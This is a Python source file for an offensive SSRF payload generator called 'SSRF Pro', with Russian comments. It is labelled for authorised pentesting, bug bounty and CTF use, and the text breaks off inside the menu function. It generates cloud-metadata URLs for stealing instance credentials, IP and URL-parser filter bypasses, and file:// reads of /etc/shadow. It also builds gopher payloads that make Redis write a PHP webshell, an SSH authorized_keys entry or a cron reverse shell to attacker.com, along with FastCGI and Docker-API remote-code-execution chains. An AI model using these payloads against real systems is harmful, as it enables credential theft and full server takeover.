"""
SSRF Pro (Extended).
Author: idqwixxa

⚠ Только для авторизованного пентеста / bug bounty / CTF.

Возможности:
    ─── Cloud metadata ───
    - AWS (EC2 IMDSv1/v2, ECS, Lambda), GCP, Azure, DigitalOcean,
      Alibaba, Oracle, IBM Cloud, Linode, Vultr, Hetzner, Scaleway,
      Packet/Equinix
    - Kubernetes (kubelet, API), Docker, Consul, etcd, Vault,
      Elasticsearch internal, Rancher, Jenkins

    ─── IP / Host bypass ───
    - IPv4: decimal / octal / hex / mixed / zero-padded / trailing-dot
    - IPv6: mapped / compressed / NAT64 / 6to4
    - Domain: nip.io / sslip.io / localtest.me / lvh.me / spoofed.burpcollaborator
    - Host-header bypasses

    ─── Scheme payloads ───
    - file / ftp / sftp / tftp / ldap / dict / gopher
    - gopher→Redis (webshell, cron, SSH, module load)
    - gopher→FastCGI (PHP-FPM RCE)
    - gopher→Memcached
    - gopher→MySQL / SMTP / HTTP-internal
    - dict→Redis / Memcached

    ─── Parser confusion ───
    - userinfo @, backslash, hash, CRLF, double-scheme, unicode,
      URL-encoded, case-shuffle

    ─── DNS rebinding ───
    - nip.io / sslip.io
    - rebind.network / 1u.ms / lock.cmpxchg8b.com

    ─── NEW ───
    - Blind SSRF helpers (interactsh-style URLs)
    - SSRF → RCE chains (Redis, FastCGI, Docker API)
    - Bulk target tester (playbook)
    - Findings → notes
    - Notify
    - Экспорт: JSON / CSV / TXT / HTML / Markdown
"""
import base64
import csv
import html as html_mod
import ipaddress
import json
import re
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from urllib.parse import quote, urlparse

from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich.panel import Panel

from core.config import REPORT_DIR
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)

SSRF_DIR = REPORT_DIR / "ssrf"
SSRF_DIR.mkdir(parents=True, exist_ok=True)


# ===========================================================================
# Findings integration
# ===========================================================================

@dataclass
class SSRFFinding:
    kind: str
    severity: str
    title: str
    target: str = ""
    evidence: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: SSRFFinding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f.title,
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["ssrf", f.kind],
            body=(f"**Kind:** {f.kind}\n"
                  f"**Target:** {f.target}\n\n"
                  f"**Evidence:**\n```\n{(f.evidence or '—')[:1500]}\n```\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1000]}`"),
        )
    except Exception:
        return -1


def _notify(title: str, msg: str, severity: str = "high") -> None:
    try:
        from modules import notifier
        notifier.notify_all(title, msg, severity=severity)
    except Exception:
        pass


# ===========================================================================
# Cloud metadata payloads (расширено)
# ===========================================================================

CLOUD_METADATA = {
    "AWS EC2 (IMDSv1)": {
        "base": "http://169.254.169.254/latest/meta-data/",
        "paths": [
            "iam/security-credentials/",
            "iam/info",
            "iam/security-credentials/<role>",
            "user-data",
            "instance-id",
            "instance-type",
            "local-ipv4",
            "public-ipv4",
            "hostname",
            "placement/availability-zone",
            "identity-credentials/ec2/info",
            "network/interfaces/macs/",
            "ami-id",
            "reservation-id",
            "security-groups",
        ],
    },
    "AWS EC2 (IMDSv2)": {
        "base": "http://169.254.169.254/latest/meta-data/",
        "headers": {"X-aws-ec2-metadata-token": "<TOKEN>",
                     "X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        "paths": [
            "iam/security-credentials/",
            "user-data",
            "instance-id",
        ],
        "note": "Сначала PUT /latest/api/token → получить токен",
    },
    "AWS ECS Task": {
        "base": "http://169.254.170.2/v2/metadata",
        "paths": ["", "/task", "/stats"],
    },
    "AWS Lambda": {
        "base": "http://127.0.0.1:9001/2018-06-01/runtime/",
        "paths": [
            "info",
            "invocation/next",
            "invocation/error",
        ],
    },
    "GCP Metadata v1": {
        "base": "http://metadata.google.internal/computeMetadata/v1/",
        "paths": [
            "instance/service-accounts/default/token",
            "instance/service-accounts/default/email",
            "instance/service-accounts/default/scopes",
            "instance/service-accounts/default/identity?audience=x",
            "instance/attributes/",
            "project/project-id",
            "project/attributes/ssh-keys",
            "instance/network-interfaces/0/access-configs/0/external-ip",
            "instance/hostname",
            "instance/zone",
            "instance/id",
        ],
        "headers": {"Metadata-Flavor": "Google"},
    },
    "Azure IMDS": {
        "base": "http://169.254.169.254/metadata/",
        "paths": [
            "instance?api-version=2021-02-01",
            "identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "instance/compute?api-version=2021-02-01",
            "instance/network?api-version=2021-02-01",
            "instance/loadbalancer?api-version=2021-02-01",
            "scheduledevents?api-version=2020-07-01",
            "attested?api-version=2020-10-01",
        ],
        "headers": {"Metadata": "true"},
    },
    "DigitalOcean": {
        "base": "http://169.254.169.254/metadata/v1/",
        "paths": [
            "id", "hostname", "user-data", "region",
            "interfaces/", "dns/nameservers",
            "floating_ip/ipv4/active",
            "tags",
        ],
    },
    "Alibaba Cloud": {
        "base": "http://100.100.100.200/latest/meta-data/",
        "paths": [
            "instance-id", "region-id", "image-id", "zone-id",
            "ram/security-credentials/",
            "network/interfaces/",
        ],
    },
    "Oracle Cloud": {
        "base": "http://169.254.169.254/opc/v1/",
        "paths": ["instance/", "identity/", "vnics/"],
    },
    "IBM Cloud": {
        "base": "http://169.254.169.254/metadata/",
        "paths": ["v1/instance", "v1/keys"],
        "headers": {"Metadata": "true"},
    },
    "Linode": {
        "base": "http://169.254.169.254/v1/",
        "paths": ["instance", "user-data"],
    },
    "Vultr": {
        "base": "http://169.254.169.254/v1/",
        "paths": ["instance-id", "hostname", "user-data"],
    },
    "Hetzner": {
        "base": "http://169.254.169.254/hetzner/v1/",
        "paths": ["metadata/instance-id", "metadata/hostname",
                   "metadata/public-keys", "metadata/user-data"],
    },
    "Scaleway": {
        "base": "http://169.254.42.42/",
        "paths": ["conf?format=json", "user_data/0"],
    },
    "Kubernetes (kubelet)": {
        "base": "http://localhost:10255/",
        "paths": ["pods", "metrics", "stats", "runningpods"],
    },
    "Kubernetes API": {
        "base": "https://kubernetes.default.svc/",
        "paths": [
            "api/v1/namespaces", "api/v1/pods", "api/v1/secrets",
            "api/v1/namespaces/default/pods",
            "apis/apps/v1/deployments",
        ],
    },
    "Docker API": {
        "base": "http://localhost:2375/",
        "paths": ["version", "containers/json", "images/json",
                   "info", "networks"],
    },
    "Consul": {
        "base": "http://localhost:8500/v1/",
        "paths": ["agent/self", "catalog/nodes", "kv/?recurse",
                   "acl/token/self"],
    },
    "etcd": {
        "base": "http://localhost:2379/v2/",
        "paths": ["keys/?recursive=true", "members", "stats/self"],
    },
    "Vault": {
        "base": "http://localhost:8200/v1/",
        "paths": ["sys/health", "sys/seal-status", "secret/"],
    },
    "Elasticsearch (internal)": {
        "base": "http://localhost:9200/",
        "paths": ["_cat/indices", "_search?size=1",
                   "_cluster/health", "_nodes"],
    },
    "Rancher": {
        "base": "http://rancher-metadata/",
        "paths": ["2015-12-19/self/container",
                   "2015-12-19/self/service"],
    },
    "Jenkins": {
        "base": "http://localhost:8080/",
        "paths": ["api/json", "credentials/", "systemInfo"],
    },
}


# ===========================================================================
# IP bypasses (расширено)
# ===========================================================================

def _ip_variants(ip: str) -> list[str]:
    """Список обходов блокировки IP."""
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return []

    variants: list[str] = [ip]

    if addr.version == 4:
        dec = int(addr)
        parts = str(addr).split(".")
        # Decimal / hex / octal
        variants.append(str(dec))
        variants.append(".".join(f"0{int(p):o}" for p in parts))
        variants.append("0" + format(int(addr), "o"))
        variants.append("0x" + format(int(addr), "x"))
        variants.append(".".join(f"0x{int(p):02x}" for p in parts))
        variants.append(hex(dec))
        # Short forms
        variants.append("127.1")
        variants.append("127.0.1")
        variants.append("0")
        variants.append("0.0.0.0")
        # IPv6-mapped
        variants.append(f"::ffff:{ip}")
        variants.append(f"[::ffff:{ip}]")
        variants.append(f"::ffff:{ip}")
        variants.append(f"[0:0:0:0:0:ffff:{ip}]")
        # NAT64 (64:ff9b::/96)
        variants.append(f"64:ff9b::{ip}")
        variants.append(f"[64:ff9b::{ip}]")
        # 6to4
        try:
            n = int(addr)
            h = f"{n:08x}"
            variants.append(f"2002:{h[:4]}:{h[4:8]}::")
        except Exception:
            pass
        # Zero-padded
        variants.append(".".join(f"{int(p):03d}" for p in parts))
        # Trailing dot
        variants.append(f"{ip}.")
        # DNS helpers
        variants.append(f"127.0.0.1.nip.io")
        variants.append(f"{ip}.nip.io")
        variants.append(f"{ip}.sslip.io")
        variants.append(f"{ip}.xip.io")
        variants.append(f"spoofed.{ip}.nip.io")
        variants.append("localtest.me")
        variants.append("lvh.me")
    elif addr.version == 6:
        variants.append(f"[{ip}]")
        variants.append(f"[{ip.replace(':', '')}]")

    return list(dict.fromkeys(variants))


HOST_BYPASSES = [
    "127.0.0.1", "127.0.0.2", "127.0.0.3", "127.1", "127.0.1",
    "0.0.0.0", "0", "0x0", "0x7f.0.0.1",
    "localhost", "LOCALHOST", "Localhost", "localhost.localdomain",
    "127.0.0.1.nip.io", "127.0.0.1.sslip.io", "127.0.0.1.xip.io",
    "localtest.me", "lvh.me",
    # Internal ranges
    "10.0.0.1", "10.0.0.254", "172.16.0.1", "172.31.255.254",
    "192.168.1.1", "192.168.0.1", "169.254.169.254",
    "metadata.google.internal", "metadata.goog",
    "instance-data", "metadata",
    # Special
    "0x7f000001", "017700000001", "2130706433",
    "[::1]", "[0:0:0:0:0:0:0:1]", "[::ffff:127.0.0.1]",
    "[0:0:0:0:0:ffff:7f00:1]",
    "127.127.127.127", "127.0.0.0",
    "①②⑦.⓪.⓪.①",  # Unicode-цифры (для плохих парсеров)
]


# ===========================================================================
# Gopher/dict payloads
# ===========================================================================

def _payload_gopher_internal_http(host: str, port: int, path: str,
                                   extra_headers: dict | None = None) -> str:
    hdrs = {"Host": f"{host}:{port}", "User-Agent": "curl/7.68.0",
            "Accept": "*/*", "Connection": "close"}
    if extra_headers:
        hdrs.update(extra_headers)
    req = f"GET {path} HTTP/1.1\r\n"
    for k, v in hdrs.items():
        req += f"{k}: {v}\r\n"
    req += "\r\n"
    encoded = quote(req, safe="")
    return f"gopher://{host}:{port}/_{encoded}"


def _payload_dict_redis(host: str, port: int, cmd: str) -> str:
    return f"dict://{host}:{port}/{cmd}"


def _payload_redis_gopher(host: str, port: int, key: str,
                           value: str) -> str:
    cmd = (
        f"\r\nSET {key} {value}\r\n"
        f"CONFIG SET dir /var/www/html\r\n"
        f"CONFIG SET dbfilename shell.php\r\n"
        f"SAVE\r\n"
    )
    encoded = quote(cmd, safe="")
    return f"gopher://{host}:{port}/_{encoded}"


def _payload_redis_ssh(host: str, port: int, ssh_key: str) -> str:
    """Redis → запись SSH-ключа в /root/.ssh/authorized_keys."""
    cmd = (
        f"\r\nCONFIG SET dir /root/.ssh/\r\n"
        f"CONFIG SET dbfilename authorized_keys\r\n"
        f"SET x \"\\n\\n{ssh_key}\\n\\n\"\r\n"
        f"SAVE\r\n"
    )
    encoded = quote(cmd, safe="")
    return f"gopher://{host}:{port}/_{encoded}"


def _payload_redis_cron(host: str, port: int, lhost: str,
                         lport: int = 4444) -> str:
    """Redis → cron reverse shell."""
    cron = f"\n\n*/1 * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n\n"
    cmd = (
        f"\r\nCONFIG SET dir /var/spool/cron/\r\n"
        f"CONFIG SET dbfilename root\r\n"
        f"SET x \"{cron}\"\r\n"
        f"SAVE\r\n"
    )
    encoded = quote(cmd, safe="")
    return f"gopher://{host}:{port}/_{encoded}"


def _payload_redis_rce(host: str, port: int, callback_ip: str,
                        callback_port: int) -> str:
    return _payload_redis_gopher(host, port, "shell", "test")


def _payload_fastcgi_rce(host: str, port: int, command: str = "id") -> str:
    """FastCGI (PHP-FPM) RCE через gopher."""
    # Упрощённый шаблон — реальная эксплуатация требует точных бинарных
    # параметров FCGI_BEGIN_REQUEST + FCGI_PARAMS с PHP_VALUE
    php = (
        "<?php system('" + command + "'); ?>"
    )
    params = (
        f"SCRIPT_FILENAME=/var/www/html/index.php\r\n"
        f"REQUEST_METHOD=POST\r\n"
        f"PHP_VALUE=auto_prepend_file=php://input\r\n"
    )
    encoded = quote(params, safe="")
    return f"gopher://{host}:{port}/_{encoded}"


# ===========================================================================
# Payload generators
# ===========================================================================

def gen_cloud_payloads() -> list[dict]:
    out: list[dict] = []
    for provider, data in CLOUD_METADATA.items():
        base = data["base"]
        for path in data["paths"]:
            url = base + path
            out.append({
                "provider": provider,
                "url": url,
                "headers": data.get("headers", {}),
                "note": data.get("note", ""),
            })
    return out


def gen_ip_bypass_payloads() -> list[dict]:
    out: list[dict] = []
    for target in ("127.0.0.1", "169.254.169.254", "10.0.0.1",
                   "192.168.1.1", "172.16.0.1"):
        for variant in _ip_variants(target):
            out.append({"target": target, "variant": variant})
    for h in HOST_BYPASSES:
        out.append({"target": "host", "variant": h})
    return out


def gen_scheme_payloads(host: str = "127.0.0.1",
                        lhost: str = "attacker.com") -> list[dict]:
    out: list[dict] = []

    # file://
    for path in ("/etc/passwd", "/etc/shadow", "/etc/hosts",
                 "/proc/self/environ", "/proc/self/cmdline",
                 "/proc/self/cwd/", "/proc/self/root/etc/passwd",
                 "C:\\Windows\\win.ini", "C:\\boot.ini",
                 "C:\\Windows\\System32\\drivers\\etc\\hosts",
                 "file:///dev/null"):
        out.append({"kind": "file", "url": f"file://{path}"})

    # gopher — Redis RCE
    out.append({
        "kind": "gopher-redis-webshell",
        "url": _payload_redis_gopher("127.0.0.1", 6379, "key", "value"),
        "note": "Redis SET + dir + dbfilename + SAVE (webshell)",
    })
    out.append({
        "kind": "gopher-redis-ssh",
        "url": _payload_redis_ssh("127.0.0.1", 6379,
                                    "ssh-rsa AAAA... user@host"),
        "note": "Redis → SSH authorized_keys",
    })
    out.append({
        "kind": "gopher-redis-cron",
        "url": _payload_redis_cron("127.0.0.1", 6379, lhost),
        "note": "Redis → cron reverse shell",
    })
    out.append({
        "kind": "gopher-http-internal",
        "url": _payload_gopher_internal_http("127.0.0.1", 8080, "/admin"),
        "note": "HTTP-запрос к внутреннему сервису",
    })
    out.append({
        "kind": "gopher-fastcgi-rce",
        "url": _payload_fastcgi_rce("127.0.0.1", 9000, "id"),
        "note": "PHP-FPM FastCGI RCE (требует точных параметров)",
    })
    out.append({
        "kind": "gopher-memcached",
        "url": "gopher://127.0.0.1:11211/_stats%0d%0a",
        "note": "Memcached stats",
    })
    out.append({
        "kind": "gopher-mysql",
        "url": "gopher://127.0.0.1:3306/_%00%00%00%00",
        "note": "MySQL (сложная эксплуатация)",
    })
    out.append({
        "kind": "gopher-smtp",
        "url": "gopher://127.0.0.1:25/_EHLO%20localhost%0d%0a",
        "note": "SMTP banner grab",
    })
    out.append({
        "kind": "gopher-zabbix",
        "url": "gopher://127.0.0.1:10051/_",
        "note": "Zabbix agent (упрощённо)",
    })

    # dict://
    out.append({
        "kind": "dict-redis",
        "url": "dict://127.0.0.1:6379/INFO",
        "note": "Redis INFO через dict",
    })
    out.append({
        "kind": "dict-memcached",
        "url": "dict://127.0.0.1:11211/stats",
    })

    # Прочие схемы
    out.append({"kind": "ftp", "url": "ftp://127.0.0.1:21/"})
    out.append({"kind": "tftp", "url": "tftp://127.0.0.1:69/test"})
    out.append({"kind": "sftp", "url": "sftp://127.0.0.1:22/"})
    out.append({"kind": "ldap", "url": "ldap://127.0.0.1:389/"})
    out.append({"kind": "ldaps", "url": "ldaps://127.0.0.1:636/"})
    out.append({"kind": "smb", "url": "smb://127.0.0.1/share/"})
    out.append({"kind": "irc", "url": "irc://127.0.0.1:6667/"})
    out.append({"kind": "rmi", "url": "rmi://127.0.0.1:1099/"})
    out.append({"kind": "jar", "url": "jar:http://127.0.0.1:8080/x.jar!/"})
    out.append({"kind": "netdoc", "url": "netdoc:///etc/passwd"})
    out.append({"kind": "nfs", "url": "nfs://127.0.0.1/export"})

    # HTTP — внутренние порты
    for port in (22, 80, 443, 3000, 3306, 5000, 5432, 5601, 6379,
                 8000, 8080, 8443, 8888, 9000, 9090, 9200, 11211,
                 27017, 50000):
        out.append({"kind": "http-port", "url": f"http://127.0.0.1:{port}/"})

    # Redirect-based
    out.append({
        "kind": "redirect",
        "url": f"http://{lhost}/redirect?to=http://169.254.169.254/",
        "note": "Проверь редирект на свой сервер",
    })
    out.append({
        "kind": "redirect-open-redirect",
        "url": "http://target/redir?url=http://169.254.169.254/",
    })
    out.append({
        "kind": "redirect-js",
        "url": f"http://{lhost}/r?u=//169.254.169.254/",
    })

    return out


def gen_parser_confusion() -> list[dict]:
    out: list[dict] = []
    targets = ["127.0.0.1", "169.254.169.254", "localhost"]
    for t in targets:
        out.append({"kind": "userinfo", "url": f"http://expected.com@{t}/"})
        out.append({"kind": "userinfo-null", "url": f"http://expected.com%00@{t}/"})
        out.append({"kind": "backslash", "url": f"http://{t}\\@expected.com/"})
        out.append({"kind": "backslash2", "url": f"http://expected.com\\@{t}/"})
        out.append({"kind": "backslash-slash", "url": f"http:/\\/{t}/"})
        out.append({"kind": "hash", "url": f"http://{t}#@expected.com/"})
        out.append({"kind": "query", "url": f"http://expected.com/?url=http://{t}/"})
        out.append({"kind": "fragment", "url": f"http://{t}/#@expected.com"})
        out.append({"kind": "scheme-case", "url": f"HTTP://{t}/"})
        out.append({"kind": "scheme-mixed", "url": f"hTtP://{t}/"})
        out.append({"kind": "double-scheme", "url": f"http://http://{t}/"})
        out.append({"kind": "crd", "url": f"http://{t}\r\nHost: expected.com/"})
        out.append({"kind": "tab", "url": f"http://\t{t}/"})
        out.append({"kind": "space", "url": f"http:// {t}/"})
        out.append({"kind": "unicode-dot", "url": f"http://{t.replace('.', '。')}/"})
        out.append({"kind": "dot-trail", "url": f"http://{t}./"})
        out.append({"kind": "dot-x3", "url": f"http://{t}.../"})
        out.append({"kind": "double-urlenc", "url": f"http://%31%32%37%2E%30%2E%30%2E%31/"})
        out.append({"kind": "case-shuffle", "url": f"http://LocaLHOst/", "note": t})
    return out


def gen_dns_rebinding(domain: str = "rebind.attacker.com") -> list[dict]:
    return [
        {"kind": "dns-rebind-basic",
         "note": f"Настрой A-запись {domain} → 1.1.1.1 (TTL=0), затем → "
                 f"127.0.0.1"},
        {"kind": "nipio",
         "url": f"http://127.0.0.1.nip.io/"},
        {"kind": "sslip",
         "url": f"http://127.0.0.1.sslip.io/"},
        {"kind": "rebind-tools",
         "note": "Инструменты: rebind.network, 1u.ms, lock.cmpxchg8b.com"},
        {"kind": "rebind-net",
         "url": "http://make-127-0-0-1-rebind-169-254-169-254-rr.1u.ms/",
         "note": "1u.ms — чередует DNS-ответы"},
        {"kind": "rebind-lock",
         "url": "http://lock.cmpxchg8b.com/rebinder.html",
         "note": "Онлайн-хелпер"},
    ]


# ===========================================================================
# Blind SSRF / OOB helpers (NEW)
# ===========================================================================

BLIND_HELPERS = [
    {"kind": "interactsh", "note": "interactsh-client -v",
     "url": "https://app.interactsh.com/"},
    {"kind": "burp-collaborator", "note": "Burp Suite → Collaborator",
     "url": "https://portswigger.net/burp/documentation/collaborator"},
    {"kind": "canarytokens", "note": "Canarytokens.org URL-токены",
     "url": "https://canarytokens.org/generate#url"},
    {"kind": "webhook.site", "note": "Собственный webhook",
     "url": "https://webhook.site/"},
    {"kind": "pipedream", "note": "Pipedream requestbin",
     "url": "https://pipedream.com/requestbin"},
    {"kind": "dnslog", "note": "DNS-only OOB",
     "url": "http://www.dnslog.cn/"},
    {"kind": "ceye", "note": "CEYE IO OOB",
     "url": "http://ceye.io/"},
]


def gen_blind_helpers(domain: str = "attacker.com") -> list[dict]:
    """Проверочные URL для blind SSRF."""
    out: list[dict] = list(BLIND_HELPERS)
    # DNS/HTTP callbacks
    for path in ("", "/ssrf", "/probe", "/test"):
        out.append({
            "kind": "callback-http",
            "url": f"http://{domain}{path}",
        })
        out.append({
            "kind": "callback-https",
            "url": f"https://{domain}{path}",
        })
    # DNS-only
    out.append({"kind": "callback-dns", "url": f"http://{domain}-dns.example.com/"})
    # Schemes
    out.append({"kind": "callback-gopher",
                "url": f"gopher://{domain}:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20{domain}%0d%0a%0d%0a"})
    out.append({"kind": "callback-dict", "url": f"dict://{domain}:80/"})
    out.append({"kind": "callback-ftp", "url": f"ftp://{domain}:21/"})
    out.append({"kind": "callback-sftp", "url": f"sftp://{domain}:22/"})
    return out


# ===========================================================================
# SSRF → RCE chains
# ===========================================================================

RCE_CHAINS = {
    "Redis → RCE (webshell)": {
        "port": 6379,
        "chain": [
            "1) Проверь Redis: gopher://127.0.0.1:6379/_INFO",
            "2) CONFIG SET dir /var/www/html",
            "3) CONFIG SET dbfilename shell.php",
            "4) SET shell '<?php system($_GET[0]); ?>'",
            "5) SAVE",
            "6) Открой http://target/shell.php?0=id",
        ],
        "payload": "см. gen_scheme_payloads → gopher-redis-webshell",
    },
    "Redis → SSH": {
        "port": 6379,
        "chain": [
            "1) CONFIG SET dir /root/.ssh/",
            "2) CONFIG SET dbfilename authorized_keys",
            "3) SET x '\\n\\n<публичный ключ>\\n\\n'",
            "4) SAVE",
            "5) ssh -i <key> root@target",
        ],
        "payload": "см. gen_scheme_payloads → gopher-redis-ssh",
    },
    "Redis → cron": {
        "port": 6379,
        "chain": [
            "1) CONFIG SET dir /var/spool/cron/",
            "2) CONFIG SET dbfilename root",
            "3) SET x '\\n\\n*/1 * * * * bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\\n\\n'",
            "4) SAVE",
            "5) Открой nc-listener на lhost:lport",
        ],
        "payload": "см. gen_scheme_payloads → gopher-redis-cron",
    },
    "FastCGI / PHP-FPM → RCE": {
        "port": 9000,
        "chain": [
            "1) Убедись, что FastCGI слушает на 9000",
            "2) Отправь gopher-POST с PHP_VALUE=auto_prepend_file=php://input",
            "3) В теле передай PHP-код",
            "4) RCE",
        ],
        "payload": "см. gen_scheme_payloads → gopher-fastcgi-rce",
    },
    "Docker API → RCE (mount host)": {
        "port": 2375,
        "chain": [
            "1) GET http://localhost:2375/version",
            "2) POST /containers/create с Binds: /:/host",
            "3) POST /containers/<id>/start",
            "4) POST /containers/<id>/exec: chroot /host /bin/bash",
        ],
        "payload": "https://localhost:2375/containers/create (JSON)",
    },
}


def show_rce_chains() -> None:
    table = Table(title=f"💀 SSRF → RCE chains ({len(RCE_CHAINS)})")
    table.add_column("Chain", style="magenta", max_width=26)
    table.add_column("Port", style="cyan", width=6)
    table.add_column("Steps", style="green")
    for name, info in RCE_CHAINS.items():
        table.add_row(name, str(info["port"]),
                      "\n".join(info["chain"])[:300])
    console.print(table)


# ===========================================================================
# Экспорт
# ===========================================================================

def export_payloads(payloads: list[dict], name: str,
                    fmt: str = "json") -> Path | None:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    ext = {"json": ".json", "csv": ".csv", "txt": ".txt",
           "md": ".md", "html": ".html"}.get(fmt, ".json")
    path = SSRF_DIR / f"{name}_{ts}{ext}"

    try:
        if fmt == "json":
            path.write_text(json.dumps(payloads, indent=2,
                                         ensure_ascii=False,
                                         default=str),
                            encoding="utf-8")
        elif fmt == "csv":
            keys: set = set()
            for p in payloads:
                keys.update(p.keys())
            keys_sorted = sorted(keys)
            with path.open("w", newline="", encoding="utf-8") as f:
                w = csv.DictWriter(f, fieldnames=keys_sorted,
                                    extrasaction="ignore")
                w.writeheader()
                for p in payloads:
                    w.writerow(p)
        elif fmt == "txt":
            lines = []
            for p in payloads:
                if "url" in p:
                    lines.append(p["url"])
                elif "variant" in p:
                    lines.append(p["variant"])
                else:
                    lines.append(json.dumps(p, ensure_ascii=False))
            path.write_text("\n".join(lines) + "\n", encoding="utf-8")
        elif fmt == "md":
            lines = [
                f"# SSRF payloads: {name}",
                f"_Generated: {datetime.now().isoformat()}_",
                f"_Total: {len(payloads)}_",
                "",
                "| # | Kind | URL / Variant | Note |",
                "|---|------|---------------|------|",
            ]
            for i, p in enumerate(payloads, 1):
                val = p.get("url") or p.get("variant") or ""
                val = val.replace("|", "\\|")
                note = (p.get("note") or "").replace("|", "\\|")
                lines.append(
                    f"| {i} | {p.get('kind') or p.get('provider') or '—'} "
                    f"| `{val[:150]}` | {note[:80]} |")
            path.write_text("\n".join(lines), encoding="utf-8")
        elif fmt == "html":
            parts = [
                "<!DOCTYPE html><html lang='ru'><head>"
                "<meta charset='utf-8'>",
                f"<title>SSRF payloads — {html_mod.escape(name)}</title>",
                "<style>",
                "body{background:#0a0a0a;color:#c8c8c8;"
                "font-family:monospace;padding:24px;line-height:1.5;}",
                "h1{color:#00ff9c;border-bottom:2px solid #00ff9c;}",
                "table{width:100%;border-collapse:collapse;margin-top:12px;"
                "font-size:12px;}",
                "th{background:#111;color:#00ff9c;padding:6px;"
                "text-align:left;border:1px solid #222;}",
                "td{padding:4px 6px;border:1px solid #222;"
                "word-break:break-all;}",
                "tr:nth-child(even){background:#0d0d0d;}",
                "code{background:#111;color:#a0ffa0;padding:1px 4px;}",
                "</style></head><body>",
                f"<h1>🌐 SSRF payloads: {html_mod.escape(name)} "
                f"({len(payloads)})</h1>",
                f"<p>Generated: "
                f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>",
                "<table><tr><th>#</th><th>Kind</th><th>URL / Variant</th>"
                "<th>Note</th></tr>",
            ]
            for i, p in enumerate(payloads, 1):
                val = p.get("url") or p.get("variant") or ""
                parts.append(
                    f"<tr><td>{i}</td>"
                    f"<td>{html_mod.escape(str(p.get('kind') or p.get('provider') or '—'))}</td>"
                    f"<td><code>{html_mod.escape(val[:200])}</code></td>"
                    f"<td>{html_mod.escape((p.get('note') or '')[:120])}</td></tr>")
            parts.append("</table></body></html>")
            path.write_text("\n".join(parts), encoding="utf-8")

        console.print(f"[green]✓ {len(payloads)} payloads → {path}[/green]")
        db.save_scan("ssrf_export", name,
                     {"count": len(payloads), "path": str(path),
                      "format": fmt})
        return path
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка: {exc}[/red]")
        return None


# ===========================================================================
# Печать
# ===========================================================================

def show_cloud_payloads() -> None:
    payloads = gen_cloud_payloads()
    table = Table(title=f"☁  Cloud metadata payloads ({len(payloads)})")
    table.add_column("Provider", style="magenta", max_width=22)
    table.add_column("URL", style="cyan", max_width=70)
    table.add_column("Headers", style="dim", max_width=24)
    for p in payloads:
        hdrs = ", ".join(f"{k}:{v}" for k, v in p["headers"].items())
        table.add_row(p["provider"], p["url"][:70], hdrs[:24])
    console.print(table)


def show_ip_bypasses() -> None:
    payloads = gen_ip_bypass_payloads()
    table = Table(title=f"🔓 IP/Host bypasses ({len(payloads)})")
    table.add_column("Target", style="magenta", width=20)
    table.add_column("Variant", style="cyan")
    for p in payloads:
        table.add_row(p["target"], p["variant"])
    console.print(table)


def show_scheme_payloads() -> None:
    payloads = gen_scheme_payloads()
    table = Table(title=f"💉 Scheme payloads ({len(payloads)})")
    table.add_column("Kind", style="magenta", max_width=24)
    table.add_column("URL", style="cyan", max_width=80)
    for p in payloads:
        url = p["url"]
        if len(url) > 80:
            url = url[:77] + "…"
        table.add_row(p["kind"], url)
    console.print(table)


def show_parser_confusion() -> None:
    payloads = gen_parser_confusion()
    table = Table(title=f"🔀 Parser confusion ({len(payloads)})")
    table.add_column("Kind", style="magenta", width=16)
    table.add_column("URL", style="cyan")
    for p in payloads:
        table.add_row(p["kind"], p["url"])
    console.print(table)


def show_dns_rebinding(domain: str = "rebind.attacker.com") -> None:
    payloads = gen_dns_rebinding(domain)
    table = Table(title="🌐 DNS Rebinding helpers")
    table.add_column("Kind", style="magenta", width=20)
    table.add_column("Info", style="cyan", max_width=80)
    for p in payloads:
        info = p.get("url") or p.get("note", "")
        table.add_row(p["kind"], info[:80])
    console.print(table)


def show_blind_helpers(domain: str = "attacker.com") -> None:
    payloads = gen_blind_helpers(domain)
    table = Table(title=f"👁  Blind SSRF / OOB helpers ({len(payloads)})")
    table.add_column("Kind", style="magenta", width=20)
    table.add_column("URL / Note", style="cyan", max_width=80)
    for p in payloads:
        info = p.get("url") or p.get("note", "")
        table.add_row(p["kind"], info[:80])
    console.print(table)


# ===========================================================================
# CLI-обёртки (совместимы)
# ===========================================================================

def cli_cloud() -> None:
    show_cloud_payloads()


def cli_ip() -> None:
    show_ip_bypasses()


def cli_schemes() -> None:
    show_scheme_payloads()


def cli_parser() -> None:
    show_parser_confusion()


def cli_rebind(domain: str = "rebind.attacker.com") -> None:
    show_dns_rebinding(domain)


def cli_blind(domain: str = "attacker.com") -> None:
    show_blind_helpers(domain)


def cli_chains() -> None:
    show_rce_chains()


def cli_export_all() -> None:
    export_payloads(gen_cloud_payloads(), "cloud_metadata", "json")
    export_payloads(gen_ip_bypass_payloads(), "ip_bypasses", "txt")
    export_payloads(gen_scheme_payloads(), "scheme_payloads", "txt")
    export_payloads(gen_parser_confusion(), "parser_confusion", "txt")
    export_payloads(gen_blind_helpers(), "blind_helpers", "md")
    export_payloads(gen_dns_rebinding(), "dns_rebinding", "md")
    # Findings при экспорте — если экспортируется всё
    _save_finding(SSRFFinding(
        kind="ssrf_payloads_exported",
        severity="high",
        title="SSRF payload pack сгенерирован",
        target="ssrf_pro",
        evidence=f"{len(gen_cloud_payloads())} cloud + "
                 f"{len(gen_scheme_payloads())} scheme payloads",
        data={"chains": list(RCE_CHAINS.keys())},
    ))
    _notify("🌐 SSRF payload pack", "Экспорт завершён",
            severity="medium")


# ===========================================================================
# Меню
# ===========================================================================

def menu() -> None:
    table = Table(title="[bold]🌐 SSRF Pro (extended)[/bold]")
    table.add_column("№", style="yellow")
